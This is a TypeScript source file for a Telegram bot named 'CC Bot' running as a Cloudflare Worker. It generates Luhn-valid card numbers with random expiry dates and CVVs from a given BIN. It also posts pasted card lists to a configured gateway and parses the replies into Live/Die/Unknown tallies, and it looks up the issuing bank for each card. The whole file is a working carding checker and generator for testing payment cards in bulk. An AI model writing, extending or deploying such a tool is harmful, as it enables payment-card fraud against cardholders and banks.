import { sendMessage } from "./telegram";

interface Env {
  TELEGRAM_TOKEN: string;
  MOCK_GATEWAY: string;
  BIN_LOOKUP: string;
}

// ---------------------------------------------------------------------
// Helper: Luhn check & generation
// ---------------------------------------------------------------------
function luhnCheck(number: string): boolean {
  let sum = 0;
  let alternate = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    if (alternate) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    alternate = !alternate;
  }
  return sum % 10 === 0;
}

function luhnGenerate(prefix: string, length: number): string {
  let number = prefix;
  while (number.length < length - 1) number += Math.floor(Math.random() * 10);
  // compute check digit
  let sum = 0;
  let alternate = true;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    if (alternate) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    alternate = !alternate;
  }
  const check = (10 - (sum % 10)) % 10;
  return number + check;
}

// ---------------------------------------------------------------------
// BIN lookup
// ---------------------------------------------------------------------
async function lookupBin(bin: string): Promise<string> {
  const url = `https://binlist.io/lookup/${bin}/`;
  try {
    const r = await fetch(url);
    if (!r.ok) return "BIN lookup failed";
    const data = await r.json<any>();
    if (!data.success) return "BIN not found";

    const { scheme, type, category, bank, country } = data;
    return [
      `<b>BIN:</b> ${bin}`,
      `<b>Scheme:</b> ${scheme ?? "-"}`,
      `<b>Type:</b> ${type ?? "-"}`,
      `<b>Category:</b> ${category ?? "-"}`,
      `<b>Bank:</b> ${bank?.name ?? "-"}`,
      `<b>Country:</b> ${country?.emoji ?? ""} ${country?.name ?? "-"}`,
    ].join("\n");
  } catch {
    return "BIN lookup error";
  }
}

// ---------------------------------------------------------------------
// Check one card
// ---------------------------------------------------------------------
async function checkCard(env: Env, card: string): Promise<string> {
  const [cc, mm, yy, cvv] = card.split("|");
  const body = `data=${cc}|${mm}|${yy}|${cvv}`;

  const resp = await fetch(env.MOCK_GATEWAY, {
    method: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "x-requested-with": "XMLHttpRequest",
      accept: "*/*",
    },
    body,
  });

  if (!resp.ok) return "Gateway error";

  const json = await resp.json<any>();
  const msg = json.msg ?? "";

  // Parse the HTML-ish response
  const live = /color:#008000;.*Live/i.test(msg);
  const die = /color:#FF0000;.*Die/i.test(msg);
  const unknown = /color:#800080;.*Unknown/i.test(msg);

  const status = live ? "Live 🟢" : die ? "Die 🔴" : unknown ? "Unknown 🟣" : "Error";
  const bin = cc.slice(0, 6);
  const binInfo = await lookupBin(bin);

  return `<b>${status}</b>\n<code>${card}</code>\n${binInfo}`;
}

// ---------------------------------------------------------------------
// Generate cards from a BIN
// ---------------------------------------------------------------------
function generateCards(bin: string, amount: number): string[] {
  const prefix = bin.padEnd(16, "0").slice(0, 16);
  const length = 16; // most cards are 16 digits
  const cards: string[] = [];

  for (let i = 0; i < amount; i++) {
    const cc = luhnGenerate(prefix.slice(0, length - 1), length);
    const mm = String(Math.floor(Math.random() * 12) + 1).padStart(2, "0");
    const yy = String(26 + Math.floor(Math.random() * 8)).padStart(2, "0"); // 2026-2033
    const cvv = String(Math.floor(Math.random() * 900) + 100); // 3-digit
    cards.push(`${cc}|${mm}|${yy}|${cvv}`);
  }
  return cards;
}

// ---------------------------------------------------------------------
// Main handler
// ---------------------------------------------------------------------
export default {
  async fetch(request: Request, env: Env, ctx: ExecutionContext) {
    const url = new URL(request.url);

    // --------------------------------------------------------------
    // Telegram webhook entry point
    // --------------------------------------------------------------
    if (url.pathname === "/webhook" && request.method === "POST") {
      const update = await request.json<any>();
      if (!update.message) return new Response("ok");

      const msg = update.message;
      const chatId = msg.chat.id;
      const text = (msg.text ?? "").trim();
      const userId = msg.from.id;

      // Very simple command router
      const [cmd, arg] = text.split(/\s+/);

      // ------------------- /start -------------------
      if (cmd === "/start") {
        await sendMessage(
          env,
          chatId,
          `<b>CC Bot</b>\n/gen &lt;bin&gt; &lt;amount&gt; – generate cards\n/chk – paste cards (one per line, format cc|mm|yy|cvv)\n/bin &lt;bin&gt; – lookup BIN info`
        );
        return new Response("ok");
      }

      // ------------------- /gen -------------------
      if (cmd === "/gen" && arg) {
        const [bin, amtStr] = arg.split(/\s+/);
        const amount = Math.min(parseInt(amtStr) || 10, 50); // max 50
        if (bin.length < 6) {
          await sendMessage(env, chatId, "BIN must be at least 6 digits");
          return new Response("ok");
        }

        const cards = generateCards(bin, amount);
        const list = cards.map((c) => `<code>${c}</code>`).join("\n");
        await sendMessage(env, chatId, `<b>Generated ${amount} cards (BIN ${bin})</b>\n${list}`);
        return new Response("ok");
      }

      // ------------------- /bin -------------------
      if (cmd === "/bin" && arg) {
        const bin = arg.slice(0, 6);
        const info = await lookupBin(bin);
        await sendMessage(env, chatId, info);
        return new Response("ok");
      }

      // ------------------- /chk -------------------
      if (cmd === "/chk") {
        const lines = text
          .split("\n")
          .map((l) => l.trim())
          .filter((l) => /^\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}$/.test(l));

        if (lines.length === 0) {
          await sendMessage(env, chatId, "Send cards in format <code>cc|mm|yy|cvv</code> (one per line)");
          return new Response("ok");
        }

        // Limit to 20 cards per request
        const toCheck = lines.slice(0, 20);
        await sendMessage(env, chatId, `<b>Checking ${toCheck.length} cards…</b>`);

        const results: string[] = [];
        let live = 0,
          die = 0,
          unknown = 0;

        for (const card of toCheck) {
          const res = await checkCard(env, card);
          if (res.includes("Live")) live++;
          else if (res.includes("Die")) die++;
          else unknown++;
          results.push(res);
        }

        const summary = `<b>Result</b>\nLive: ${live} ✅\nDie: ${die} ❌\nUnknown: ${unknown} ❓\n\n`;
        await sendMessage(env, chatId, summary + results.join("\n\n"));
        return new Response("ok");
      }

      // ------------------- unknown -------------------
      await sendMessage(env, chatId, "Unknown command. Use /start for help.");
      return new Response("ok");
    }

    // --------------------------------------------------------------
    // Simple health-check
    // --------------------------------------------------------------
    return new Response("CC Bot Worker – POST to /webhook with Telegram updates");
  },
};
